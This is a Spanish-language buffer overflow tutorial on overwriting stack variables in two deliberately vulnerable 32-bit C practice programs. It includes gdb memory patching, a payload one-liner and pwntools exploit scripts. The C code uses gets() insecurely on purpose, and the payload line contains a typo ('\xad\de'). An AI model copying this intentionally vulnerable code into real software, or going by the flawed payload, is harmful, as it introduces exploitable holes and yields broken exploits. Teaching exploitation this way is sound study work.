---
original autor: CrazyCat
coautor: naibu3
---

#bufferOverflow 

# 01_BO_Stack_Variable_Overwritting

## ¿Qué es?

En el ejercicio anterior vimos como es posible sobreescribir registros adyacentes a una variable que actúa como buffer. Ahora, veremos como podemos aprovecharnos de esta vulnerabilidad para sobreescribir variables sensibles cercanas en memoria. Más concretamente en la zona del *stack* o *pila*, donde se guardan las variables *estáticas*.

Además trataremos de crear un script que automatice la interacción con el binario.
 
 -----
 
## Ejercicio 1

### Compilar el binario

Para este ejercicio utilizaremos el siguiente código:

```c
#include <stdio.h>
#include <string.h>

int main(void)
{
    char password[6];
    int authorised = 0;

    printf("Enter admin password: \n");
    gets(password);

    if(strcmp(password, "pass") == 0)
    {
        printf("Correct Password!\n");
        authorised = 1;
    }
    else
    {
        printf("Incorrect Password!\n");
    }

    if(authorised)
    {
        printf("Successfully logged in as Admin (authorised=%d) :)\n", authorised);
    }else{
		printf("Failed to log in as Admin (authorised=%d) :(\n", authorised);
	}

    return 0;
}
```

Estará en el fichero *login.c*. Como es un código en C debemos compilarlo (igual que el ejercicio anterior):

```bash
gcc -o login login.c -fno-stack-protector -z execstack -no-pie -m32
```

### Análisis del binario

Comenzamos comprobando sólo con el comando `file`:

```bash
file login
```
```file
login: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=3e09d2aa3945eabf7f50403d0a6f9c39fd6d360e, for GNU/Linux 3.2.0, not stripped
```

Vemos que es un binario de 32 bits, *dinamically linked* y que es *not stripped*. Vamos a lanzar ahora [[checksec]]:

```bash
checksec login
```
```checksec
Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments

```

Vemos que no tiene ninguna seguridad activa. Vamos a probar a ejecutarlo:

```bash
./login
```
```login
Enter admin password: 
123
Incorrect Password!
Failed to log in as Admin (authorised=0) :(
```

Vemos que si introducimos la contraseña `123` nos dice que es incorrecta. Aemás nos muestra lo que parece el valor de una variable `authorised`. Vamos a intentar desbordar la variable `password`:

```login
Enter admin password: 
aaaaaaaaa
Incorrect Password!
Successfully logged in as Admin (authorised=6381921) :)
```

Hemos introducido muchas "*a*", de forma que nos dice que la contraseña es incorrecta, pero la variable authorised ha sido sobreescrita, valiendo ahora `6381921`.

#### Análisis con [[ltrace]] o [[strace]]

No será posible utilizar esta herramienta en la mayor parte de los casos, sin embargo podemos utilizarla en este ejercicio para ver qué funciones se llaman en cada momento:

```bash
ltrace login
```
```ltrace
write(1, "Enter admin password: \n", 23Enter admin password: 
) = 23
fstat64(0, {st_mode=S_IFCHR|0620, st_rdev=makedev(0x88, 0x2), ...}) = 0
read(0, aaaaaaaa
"aaaaaaaa\n", 1024)             = 9
write(1, "Incorrect Password!\n", 20Incorrect Password!
)   = 20
write(1, "Successfully logged in as Admin "..., 54Successfully logged in as Admin (authorised=24929) :)
) = 54
exit_group(0)
```

Así podríamos ver qué está pasando.

#### Análisis con [[gdb]]

Vamos a ver ahora el análisis que haríamos normalmente. Para ello lanzamos [[gdb]]-[[pwndbg]]:

```bash
gdb-pwndbg login
```

Una vez dentro podemos verlas funciones con `info functions` aunque sólo tenemos `main()`, por lo que la descompilamos:

```gdb
disassemble main
```
```gdb
[...]
0x08049216 <+132>:	call   0x8049060 <puts@plt>
0x0804921b <+137>:	add    esp,0x10
0x0804921e <+140>:	cmp    DWORD PTR [ebp-0xc],0x0
0x08049222 <+144>:	je     0x804923b <main+169>
0x08049224 <+146>:	sub    esp,0x8
[...]
```

Vemos que tenemos una comparación entre el registro `ebp-0xc` y el valor `0x0`. Si lo comprobamos en [[ghidra]] veremos que dicho registro corresponde a la variable `authorised`. Vamos a establecer un *breaking point* en dicho punto:

```gdb
break 0x0804921e
ó
break *main+140
```

Ejecutamos el programa con `run` e introducimos una contraseña de prueba, por ejemplo `aaaa`:

```gdb
Enter admin password: 
test
Incorrect Password!
```

Ahora parará en el *break point*, permitiendonos ver el valor del registro que mencionamos antes:

```gdb
x $ebp - 0xc
```
```gdb
0xffffd07c:	0x00000000
```

Vemos que el valor del registro es `0` (en hexadecimal). Vamos a cambiarlo a `1`, debemos utilizar la dirección del registro, ya que `ebp - 0xc` guarda la dirección de dicho registro:

```gdb
set *0xffffd07c = 1
```

Si volvemos a mirar `ebp - 0xc`, veremos que ahora vale `1`:

```gdb
x $ebp - 0xc
```
```gdb
0xffffd07c:	0x00000001
```

Si continuamos la ejecución con `c`, veremos que ahora nos permitirá el acceso incluso sin haber proporcionado la contraseña correcta:

```gdb
Continuing.
Successfully logged in as Admin (authorised=1) :)
```


#### Script

Para practicar scripting podemos crear un script simple en python utilizando la librería [[pwntools]], que explote la vulnerabilidad:

```python
#!/bin/python3
from pwn import *

#Start binary
io = process('./login')    #En caso de ser un servidor remoto sería remote()

#Send string to overflow buffer
io.sendlineafter(b':', b'aaaaaaa')    #Manda la linea despues de detectar el prompt (:)

#Receive output
print(io.recvall().decode())
```

Si ejecutamos, funciona!

```python
[+] Starting local process './login': pid 4862
[+] Receiving all data: Done (73B)
[*] Process './login' stopped with exit code 0 (pid 4862)
 
Incorrect Password!
Successfully logged in as Admin (authorised=97) :)
```

---

## Ejercicio 2

### Compilar el binario

El código para este ejercicio estará en el fichero *overwrite.c*. Como es un código en C debemos compilarlo (igual que el ejercicio anterior):

```bash
gcc -o overwrite overwrite.c -fno-stack-protector -z execstack -no-pie -m32
```

### Reconocimiento del binario

Ya manejamos suficiente para analizar el binario sin necesidad de mirar el código, así que igual que antes lanzamos el comando `file` y `checksec`:

```bash
file overwrite
```
```file
overwrite: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=95de498432099aaf87c9ad5409b0e5362a1d519c, for GNU/Linux 3.2.0, not stripped
```

Vemos que al igual que antes nos reporta que está `dinamically linked`, que es de 32 bits y que es `not stripped`. Además luego será importante el detalle de que es de tipo `LSB`, es decir, *less significant bit*, es decir los bits de más a la izquierda son los menos significativos.

```bash
checksec overwrite
```
```checksec
Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

Aquí podemos ver que no tiene implementada ninguna medida de seguridad.

Vamos a pasar a ejecutar el programa:

```bash
./overwrite
```
```overwrite
yes? no
12345678
...
```

Si respondemos a la pregunta, vemos una serie de números. Vamos a intentar desbordar el buffer:

```overwrite
yes? aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
61616161
...
```

Ahora los números han cambiado, si decodificamos ese valor hexadecimal veremos que corresponde a `aaaa`. Por lo que este binario podría ser sensible a un *buffer overflow*.

#### Análisis del código

Este paso no es obligatorio, ya que podríamos ver el código descompilandolo con [[ghidra]], e incluso con [[gdb]]. En cualquier caso, si miramos el código fuente:

```c
[...]
int key = 0x12345678;
char buffer[32];
printf("yes? ");
fflush(stdout);
gets(buffer);
if(key == 0xdeadbeef){
[...]
```

Vemos que se está haciendo uso de un *buffer* de 32 elementos de tipo *char*, que además se asigna con `gets()`. Por otro lado, luego se comprueba que sea igual a `0xdeadbeef`. De forma que podríamos probar a desbordar el buffer con este valor:

```overwrite
yes? aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaadeadbeef
64616564
...
```

Si decodificamos la respuesta, vemos que equivale a `daed`, parece que está del revés. Así que probamos del revés:

```overwrite
yes? aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaafeebdaed
62656566
...
```

Ahora nos responde `beef`, por lo que en efecto, está del revés, ya que el binario era de tipo `LSB`. Sin embargo, no está funcionando ya que el código compara con un valor hexadecimal.

La solución está en pasar dicho valor en hexadecimal. Para facilitar las cosas lo haremos con python2 (python3 a veces da problemas con la conversión). Utilizaremos la siguiente línea:

```python
python -c 'print 32 * "a" + "\xef\xbe\xad\de"' > payload
```

Este comando simplemente creará una cadena con 32 "*a*" seguidas del valor de `deadbeef` en hexadecimal. Como no podemos simplemente copiar y pegar, dirigiremos la salida a un archivo payload, para posteriormente redirigirlo al programa:

```bash
./overwrite < payload
```
```overwrite
yes? good job!!
deadbeef
```

Y ya habríamos resuelto el ejercicio!

#### Análisis con gdb

Ahora vamos a resolver el ejercicio con [[gdb]]-[[pwndbg]]. Para ello abrimos el programa (`gdb-pwndgb overwrite`). Una vez dentro vemos qué funciones hay disponibles con:

```gdb
info functions
```
```gdb
[...]
0x08049192  do_input
0x08049267  main
[...]
```

Vemos una función `do_input`, así que la descompilamos:

```gdb
disassemble do_input
```
```gdb
[...]
0x080491e0 <+78>:	cmp    DWORD PTR [ebp-0xc],0xdeadbeef
[...]
```

Vemos que se está aplicando una comparación entre el valor del registro `ebp-0xc` y el valor hexadecimal `0xdeadbeef` (no hubiera hecho falta ver el código para encontrar este valor).

Podemos establecer un *break point* justo antes de la comparación:

```gdb
break *do_input+78
```

Ejecutamos con `run` e introducimos lo que queramos.

```gdb
yes? no
```

Si accedemos al valor del registro `ebp-0xc`, vemos que actualmente vale `0x12345678`:

```gdb
x $ebp - 0xc
```
```gdb
0xffffd03c:	0x12345678
```

Vamos a probar a cambiarlo a `0xdeadbeef`:

```gdb
set *0xffffd03c = 0xdeadbeef
```
```gdb
x $ebp - 0xc
```
```gdb
0xffffd03c:	0xdeadbeef
```

Si continuamos con `c`, hemos resuelto el ejercicio!

```gdb
c
```
```gdb
Continuing.
good job!!
deadbeef
```

#### Script

Para practicar scripting podemos crear un script simple en python utilizando la librería [[pwntools]], que explote la vulnerabilidad:

```python
#!/bin/python3
from pwn import *

# Start program
io = process('./overwrite')

# Send string to overflow buffer
io.sendlineafter(b'?', b'A' * 32 + p32(0xdeadbeef))   #No hace falta invertirlo

# Receive output
print(io.recvall().decode())
```

----

## Challenges

Para practicar es recomendable hacer los challenges de [overthewire](https://overthewire.org/wargames/narnia/) en concreto los de *narnia*. Los niveles 0 y 1 (*narnia0* y *narnia1*).